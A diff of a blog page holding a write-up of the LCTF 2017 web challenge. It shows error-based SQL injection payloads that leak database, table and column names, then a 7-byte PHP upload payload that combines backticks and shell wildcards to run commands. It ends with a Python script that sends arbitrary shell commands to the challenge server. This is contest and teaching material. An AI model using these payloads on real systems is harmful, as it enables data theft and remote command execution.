@@ -89,22 +89,27 @@
 
 
 
-<meta name="description" content="趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！先放上简单的wp版本，一些细节后续再更新吧。
+<meta name="description" content="补充关于第一阶段sql注入知识/背景，第二节阶段命令执行详细过程及其知识点
 LCTF-2017-他们有什么秘密呢-writeup">
 <meta property="og:type" content="article">
 <meta property="og:title" content="LCTF-2017-他们有什么秘密呢-writeup">
 <meta property="og:url" content="http://chybeta.github.io/2017/11/19/LCTF-2017-他们有什么秘密呢-writeup/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:description" content="趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！先放上简单的wp版本，一些细节后续再更新吧。
+<meta property="og:description" content="补充关于第一阶段sql注入知识/背景，第二节阶段命令执行详细过程及其知识点
 LCTF-2017-他们有什么秘密呢-writeup">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/9.png?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/10.png?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/11.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/18.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/19.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/20.png?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/12.png?raw=true">
-<meta property="og:updated_time" content="2017-11-19T23:26:34.939Z">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/21.png?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/4.png?raw=true">
+<meta property="og:updated_time" content="2017-11-22T14:51:29.091Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="LCTF-2017-他们有什么秘密呢-writeup">
-<meta name="twitter:description" content="趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！先放上简单的wp版本，一些细节后续再更新吧。
+<meta name="twitter:description" content="补充关于第一阶段sql注入知识/背景，第二节阶段命令执行详细过程及其知识点
 LCTF-2017-他们有什么秘密呢-writeup">
 <meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/9.png?raw=true">
 
@@ -424,7 +429,7 @@ LCTF-2017-他们有什么秘密呢-writeup">
       
 
       
-        <p>趁着期中考，复习累了做几道ctf玩玩，只做出来3道web。感谢师傅们出的题！先放上简单的wp版本，一些细节后续再更新吧。</p>
+        <p>补充关于第一阶段sql注入知识/背景，第二节阶段命令执行详细过程及其知识点</p>
 <p>LCTF-2017-他们有什么秘密呢-writeup<br><a id="more"></a></p>
 <h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">一个简单到不能再简单的......</div><div class="line">http://182.254.246.93/</div></pre></td></tr></table></figure>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/9.png?raw=true" alt=""></p>
@@ -437,7 +442,22 @@ LCTF-2017-他们有什么秘密呢-writeup">
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://182.254.246.93/entrance.php</div><div class="line"></div><div class="line">POST: pro_id=1 and linestring(pro_id)</div></pre></td></tr></table></figure>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/11.png?raw=true" alt=""></p>
 <p>得到如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">数据库名：youcanneverfindme17</div><div class="line">表名：product_2017ctf</div><div class="line">部分字段名：pro_id</div></pre></td></tr></table></figure></p>
-<h3 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h3><p>第一步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id)) as c);</div><div class="line">Duplicate column name &apos;pro_name&apos;</div></pre></td></tr></table></figure></p>
+<p>除了linestring和Polygon外，其他同样能用来报错获取得到当前表名和字段的还有：</p>
+<ol>
+<li>multiPolygon(id)</li>
+<li>multilinestring(id)</li>
+<li>GeometryCollection(id)</li>
+<li>MultiPoint(id)</li>
+</ol>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/18.png?raw=true" alt=""></p>
+<h3 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h3><p>其实这一步，可以跳过。因为利用union搭配别名子查询，可以达到在不知道字段名的时候进行注入。</p>
+<p>为了完整性，这里试一下注出字段名。</p>
+<p>利用<a href="https://drive.google.com/file/d/0B0r_xEcaZ8-JYzk3NzA0NzItNTJlMS00YTUyLThkNTQtODVkYmU4ZjMzM2Rj/view" target="_blank" rel="external">orangetw大佬的提过的技巧</a></p>
+<p>基本的原理是子查询中不允许出现相同的表名，本地环境测试如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/19.png?raw=true" alt=""></p>
+<p>之后可以利用using来逐步爆出字段名：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/20.png?raw=true" alt=""></p>
+<p>举一反三：</p>
+<p>第一步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id)) as c);</div><div class="line">Duplicate column name &apos;pro_name&apos;</div></pre></td></tr></table></figure></p>
 <p>第二步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name)) as c);</div><div class="line">Duplicate column name &apos;owner&apos;</div></pre></td></tr></table></figure></p>
 <p>第三步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner)) as c);</div><div class="line">Duplicate column name &apos;d067a0fa9dc61a6e&apos;</div></pre></td></tr></table></figure></p>
 <p>得到如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">库：youcanneverfindme17</div><div class="line">表：product_2017ctf</div><div class="line">字段: pro_id  pro_name owner,d067a0fa9dc61a6e</div></pre></td></tr></table></figure></p>
@@ -448,13 +468,36 @@ LCTF-2017-他们有什么秘密呢-writeup">
 <p>根据tips，得到下一个入口地址:d067a0fa9dc61a6e7195ca99696b5a896.php<br><!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --></p>
 <h2 id="PHP的命令执行"><a href="#PHP的命令执行" class="headerlink" title="PHP的命令执行"></a>PHP的命令执行</h2><p><a href="http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php" target="_blank" rel="external">http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php</a></p>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/12.png?raw=true" alt=""></p>
-<p>附上利用脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">url = <span class="string">"http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php"</span></div><div class="line">user_agent = <span class="string">"xxx"</span></div><div class="line"></div><div class="line">t = requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"zzz.php"</span>, <span class="string">"content"</span>:<span class="string">"&lt;?=`*`;"</span>&#125;).text</div><div class="line">[path] = re.findall(<span class="string">'files.*/zzz.php'</span>, t)</div><div class="line"></div><div class="line">requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"bash"</span>, <span class="string">"content"</span>:<span class="string">'anything'</span>&#125;)</div><div class="line">requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"bash2"</span>, <span class="string">"content"</span>:<span class="string">'cat /3*'</span>&#125;)</div><div class="line">url1 = <span class="string">"http://182.254.246.93/"</span></div><div class="line">r = requests.get(url1+path)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.text</div></pre></td></tr></table></figure></p>
-<p>至于为什么能这样做，下午再更新wp一下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">λ python2 entrance.py</div><div class="line">total 100</div><div class="line">-rw-r--r--  1 root root    53 Nov 17 12:57 327a6c4304ad5938eaf0efb6cc3e53dc.php</div><div class="line">drwxr-xr-x  2 root root  4096 Aug 16 21:33 bin</div><div class="line">drwxr-xr-x  3 root root  4096 Aug 16 21:37 boot</div></pre></td></tr></table></figure>
-<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$flag = &quot;LCTF&#123;n1ver_stop_nev2r_giveup&#125;&quot;;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>到了这里就跟 <a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web/tinyhosting-250" target="_blank" rel="external">32c3 2015 ctf-TinyHosting</a>的题目很像了。</p>
+<p>就几个知识点展开说一说。</p>
+<p>一个是<a href="http://php.net/manual/zh/language.basic-syntax.phptags.php" target="_blank" rel="external">php的短标签</a>。当php.ini的<code>short_open_tag=on</code>时，PHP支持短标签，默认情况下为off。当开启后能执行<code>&lt;? ?&gt;</code>标签内的php语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;? echo &quot;chybeta\n&quot;;?&gt;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
+<p>另一个知识点是<a href="http://php.net/manual/zh/language.operators.execution.php" target="_blank" rel="external">php的反引号命令执行</a>，php会反引号内的内容作为shell命令执行，效果与 shell_exec()同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;? $temp = `date`; echo $temp;?&gt;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">Wed Nov 22 22:01:34 CST 2017</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
+<p>第三个知识点是关于<a href="http://php.net/manual/zh/function.echo.php" target="_blank" rel="external">php的echo</a>，echo有个快捷写法，可以在打开标记前直接用一个等号。见下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$ vim test.php</div><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;?=&quot;chybeta\n&quot;;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
+<p>我们的需求：执行命令，得到回显。结合上面三个知识点，在7个字节的限制下，比如构造如下（）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?=`w`;</div></pre></td></tr></table></figure></p>
+<p>（题外话：命令<code>w</code>用于显示已经登陆系统的用户列表）</p>
+<p>运行结果：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/21.png?raw=true" alt=""></p>
+<p>不过怎么执行任意命令呢？这里用到第四个知识点，shell中的通配符<code>*</code>会将符合模式的文件列出来，之后执行，详情可见这里<a href="http://man.chinaunix.net/linux/mandrake/101/zh_cn/Command-Line.html/glob-regex.html" target="_blank" rel="external">Shell 通配符</a>。所以当文件夹下有如下文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash z.sh</div></pre></td></tr></table></figure></p>
+<p>而我在shell中直接键入一个<code>*</code>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu: *</div></pre></td></tr></table></figure></p>
+<p>shell会匹配并进行替换，完成替换后实际执行的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu: bash c.sh</div></pre></td></tr></table></figure></p>
+<p>由于这属于shell后台自动完成就不展示了。</p>
+<p>接着要考虑一点，我们需要用<code>*</code>来利用文件名执行任意命令，因此在文件名的构造顺序上需要注意。比如我们最终要在文件下生成这三个文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash c.sh z.php</div></pre></td></tr></table></figure></p>
+<p>才能成功的执行c.sh。</p>
+<p>附上利用脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">url = <span class="string">"http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php"</span></div><div class="line">user_agent = <span class="string">"xxx"</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">	command = raw_input(<span class="string">"input command: "</span>)</div><div class="line">	t = requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"z.php"</span>, <span class="string">"content"</span>:<span class="string">"&lt;?=`*`;"</span>&#125;).text</div><div class="line">	[path] = re.findall(<span class="string">'files.*/zzz.php'</span>, t)</div><div class="line"></div><div class="line">	requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"bash"</span>, <span class="string">"content"</span>:<span class="string">'anything'</span>&#125;)</div><div class="line">	requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"c.sh"</span>, <span class="string">"content"</span>: command&#125;)</div><div class="line">	url1 = <span class="string">"http://182.254.246.93/"</span></div><div class="line">	r = requests.get(url1+path)</div><div class="line">	<span class="keyword">print</span> r.text</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/4.png?raw=true" alt=""></p>
+<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$flag = &quot;LCTF&#123;n1ver_stop_nev2r_giveup&#125;&quot;;</div></pre></td></tr></table></figure></p>
 <h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
-<li>基于报错的sql注入：获取库名，表名，列名，数据</li>
-<li>php命令执行技巧: 反引号，段标签</li>
+<li>基于报错的sql注入：<ul>
+<li>获取库名，表名，列名，数据</li>
+<li>join using</li>
+</ul>
+</li>
+<li>php技巧:<ul>
+<li>短标签</li>
+<li>反引号</li>
+<li>echo缩写</li>
+</ul>
+</li>
+<li>shell通配符</li>
 </ul>
 
       
@@ -471,7 +514,7 @@ LCTF-2017-他们有什么秘密呢-writeup">
   <p><span>本文标题:</span><a href="/2017/11/19/LCTF-2017-他们有什么秘密呢-writeup/">LCTF-2017-他们有什么秘密呢-writeup</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
   <p><span>发布时间:</span>2017年11月19日 - 20:11</p>
-  <p><span>最后更新:</span>2017年11月20日 - 07:11</p>
+  <p><span>最后更新:</span>2017年11月22日 - 22:11</p>
   <p><span>原始链接:</span><a href="/2017/11/19/LCTF-2017-他们有什么秘密呢-writeup/" title="LCTF-2017-他们有什么秘密呢-writeup">http://chybeta.github.io/2017/11/19/LCTF-2017-他们有什么秘密呢-writeup/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2017/11/19/LCTF-2017-他们有什么秘密呢-writeup/"  aria-label="复制成功！"></i></span>
   </p>
@@ -627,7 +670,7 @@ LCTF-2017-他们有什么秘密呢-writeup">
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">148</span>
+                <span class="site-state-item-count">149</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -645,7 +688,7 @@ LCTF-2017-他们有什么秘密呢-writeup">
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">66</span>
+                <span class="site-state-item-count">67</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
